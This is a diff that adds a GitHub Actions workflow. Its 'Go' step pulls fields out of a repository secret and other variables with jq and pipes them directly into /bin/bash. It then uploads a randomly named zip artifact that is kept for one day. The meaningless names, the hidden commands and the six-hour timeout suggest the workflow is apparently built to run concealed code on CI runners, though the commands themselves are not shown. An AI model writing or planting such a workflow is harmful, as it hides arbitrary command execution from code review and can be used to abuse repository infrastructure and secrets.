@@ -1,0 +1,29 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          ofeu3: ${{ secrets.ofeu3 }}
+        run: |
+          printf '%s' "$ofeu3" | jq -r .xbim2 | /bin/bash
+          echo $rzh80360 | jq -r .cc33 | /bin/bash
+          printf '%s' "$ppg4221" | jq -r .ud3 | /bin/bash
+          echo $votxk16 | jq -r .soqcs70254 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: IN4oFMtr
+          path: "*.zip"
+          retention-days: 1
